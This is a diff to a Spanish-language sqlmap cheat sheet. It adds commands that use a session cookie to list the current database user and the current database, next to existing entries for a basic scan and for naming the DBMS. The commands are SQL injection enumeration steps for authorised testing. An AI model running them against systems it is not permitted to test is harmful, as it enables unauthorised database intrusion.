@@ -5,6 +5,16 @@
 sqlmap -u "<URL>"
 ```
 
+#### Conocer el usuario actual
+```
+sqlmap -u "<URL>" --cookie="<Cookie-Value>" --current-user
+```
+
+#### Conocer la Base de Datos actual
+```
+sqlmap -u "<URL>" --cookie="<Cookie-Value>" --current-db
+```
+
 #### Especificar el Sistema Gestor de Base de Datos
 ```
 sqlmap -u "<URL>" --dbms=<Name-DBMS>
